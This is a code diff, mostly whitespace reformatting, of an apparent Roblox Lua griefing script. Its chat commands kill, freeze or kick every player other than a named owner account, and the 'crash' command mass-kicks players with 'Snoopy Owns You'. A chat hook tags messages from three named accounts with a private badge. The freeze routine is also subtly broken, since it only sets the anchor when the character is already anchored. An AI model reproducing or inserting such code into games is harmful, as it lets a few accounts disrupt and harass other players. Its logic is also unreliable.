@@ -1,4 +1,5 @@
 local textChatService = game:GetService("TextChatService")
+
 local commands = {
     kill = function()
         if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
@@ -37,39 +38,39 @@ local commands = {
         end
     end,
     crash = function()
-       if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
-       wait(1)
-       for index, player in pairs(game.Players:GetPlayers()) do
-       player:Kick("Snoopy Owns You")
-      end
-   end
-end,
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+            wait(1)
+            for index, player in pairs(game.Players:GetPlayers()) do
+                player:Kick("Snoopy Owns You")
+            end
+        end
+    end,
     freeze = function()
         if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
-		local player = game.Players.LocalPlayer
-		local character = player.Character or player.CharacterAdded:Wait()
-		local humanoid = character:WaitForChild("Humanoid")
-		local function unanchorCharacter()
-			if not humanoid.RootPart.Anchored then
-				return
-			end
-			humanoid.RootPart.Anchored = true
-		end
-		unanchorCharacter()
+            local player = game.Players.LocalPlayer
+            local character = player.Character or player.CharacterAdded:Wait()
+            local humanoid = character:WaitForChild("Humanoid")
+            local function unanchorCharacter()
+                if not humanoid.RootPart.Anchored then
+                    return
+                end
+                humanoid.RootPart.Anchored = true
+            end
+            unanchorCharacter()
         end
     end,
     unfreeze = function()
         if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
-		local player = game.Players.LocalPlayer
-		local character = player.Character or player.CharacterAdded:Wait()
-		local humanoid = character:WaitForChild("Humanoid")
-		local function unanchorCharacter()
-			if not humanoid.RootPart.Anchored then
-				return
-			end
-			humanoid.RootPart.Anchored = false
-		end
-		unanchorCharacter()
+            local player = game.Players.LocalPlayer
+            local character = player.Character or player.CharacterAdded:Wait()
+            local humanoid = character:WaitForChild("Humanoid")
+            local function unanchorCharacter()
+                if not humanoid.RootPart.Anchored then
+                    return
+                end
+                humanoid.RootPart.Anchored = false
+            end
+            unanchorCharacter()
         end
     end,
     breakgame = function()
@@ -111,15 +112,13 @@ textChatService.OnIncomingMessage = function(message)
     return properties
 end
 
-
-    local textChatService = game:GetService("TextChatService")
-    textChatService.OnIncomingMessage = function(message: TextChatMessage)
-        local properties = Instance.new("TextChatMessageProperties")
-        if message.TextSource then
-            local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-            if player.Name == "SnoopyIs_Pro" or player.Name == "menamge0" or player.Name == "SnoopyIs_Better" then
-                properties.PrefixText = "<font color='#c800c8'>[SP+ PRIVATE]</font> " .. message.PrefixText
-            end
+textChatService.OnIncomingMessage = function(message)
+    local properties = Instance.new("TextChatMessageProperties")
+    if message.TextSource then
+        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
+        if player.Name == "SnoopyIs_Pro" or player.Name == "menamge0" or player.Name == "SnoopyIs_Better" then
+            properties.PrefixText = "<font color='#c800c8'>[SP+ PRIVATE]</font> " .. message.PrefixText
         end
-        return properties
     end
+    return properties
+end
